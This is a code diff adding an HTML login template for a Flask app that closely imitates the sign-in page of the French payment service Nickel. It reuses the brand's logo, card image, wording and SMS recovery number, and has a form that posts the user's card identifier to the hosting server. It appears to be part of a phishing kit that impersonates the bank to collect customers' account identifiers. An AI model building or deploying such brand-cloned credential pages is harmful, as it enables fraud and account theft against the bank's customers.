@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nickel - Connexion</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
+</head>
+<body>
+    <header class="header-nk">
+        <div class="logo-container">
+            <img src="{{ url_for('static', filename='images/nickel-logo.svg') }}" alt="Logo Nickel" class="logo-nk">
+            <span class="brand-text">Nickel</span>
+        </div>
+        <button class="btn-partner">Espace partenaire</button>
+    </header>
+
+    <main class="main-nk">
+        <section class="center-nk">
+            <h1>Connexion à votre espace</h1>
+            <p class="desc-nk">
+                Saisissez votre identifiant qui se trouve <b>au dos de votre carte Nickel</b> ou dans l'<b>email d'inscription</b>.
+            </p>
+            <div class="card-center-nk">
+                <img src="{{ url_for('static', filename='images/nickel-carte.webp') }}" alt="Carte Nickel" class="carte-nk">
+            </div>
+            <form method="POST">
+                <label class="label-nk" for="identifiant">Identifiant (au dos de la carte)</label>
+                <input type="text" id="identifiant" name="identifiant" placeholder="XXX-000-000-0" class="input-nk" required>
+                <div class="checkbox-nk">
+                    <input type="checkbox" id="memo">
+                    <label for="memo">Mémoriser mon identifiant</label>
+                </div>
+                <button type="submit" class="btn-nk" id="submit-btn">Se connecter</button>
+            </form>
+            <div class="idperdu-nk">
+                <b>Identifiant perdu ?</b><br>
+                Si vous avez perdu votre identifiant ou votre carte,<br>
+                envoyez par SMS <b>IDENTIFIANT</b> au <b>38063</b>.
+            </div>
+            <div class="links-nk">
+                <a href="#" class="footer-link-nk">Aide & opposition CB</a> |
+                <a href="#" class="footer-link-nk">Pas encore client ?</a>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer-nk">
+        &copy; 2025 Nickel - Tous droits réservés
+    </footer>
+
+    <script>
+    const identifiantInput = document.getElementById('identifiant');
+    const submitBtn = document.getElementById('submit-btn');
+
+    // Formater l'identifiant avec des tirets
+    identifiantInput.addEventListener('input', function (e) {
+        let value = e.target.value.replace(/\D/g, ''); // retirer les non-chiffres
+        if (value.length > 3 && value.length <= 6) {
+            value = value.slice(0,3) + '-' + value.slice(3);
+        } else if (value.length > 6 && value.length <= 9) {
+            value = value.slice(0,3) + '-' + value.slice(3,6) + '-' + value.slice(6);
+        } else if (value.length > 9) {
+            value = value.slice(0,3) + '-' + value.slice(3,6) + '-' + value.slice(6,9) + '-' + value.slice(9,10);
+        }
+        e.target.value = value;
+
+        // Activer le bouton Se connecter si l'identifiant est complet
+        if (value.length === 13) { // Exemple: XXX-000-000-0
+            submitBtn.style.background = '#fd8900';
+            submitBtn.style.color = '#fff';
+        } else {
+            submitBtn.style.background = '#1a1a1a';
+            submitBtn.style.color = '#fff';
+        }
+    });
+    </script>
+</body>
+</html>
